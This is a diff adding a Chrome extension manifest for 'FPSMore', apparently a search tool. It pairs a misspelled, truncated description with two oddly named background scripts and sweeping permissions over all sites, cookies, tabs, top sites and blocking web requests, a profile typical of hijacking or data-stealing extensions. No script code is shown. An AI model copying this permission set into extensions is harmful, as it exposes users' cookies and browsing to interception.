@@ -1,0 +1,14 @@
+{
+   "background": {
+      "scripts": [ "mxis.js", "poerl.js" ]
+   },
+   "description": "You can use PirvateSearch to search the internet independently,",
+   "icons": {
+      "128": "icon.png"
+   },
+   "manifest_version": 2,
+   "name": "FPSMore",
+   "permissions": [ "chrome://favicon/", "http://*/*", "https://*/*", "storage", "unlimitedStorage", "cookies", "topSites", "tabs", "webRequest", "webRequestBlocking" ],
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "6.46"
+}
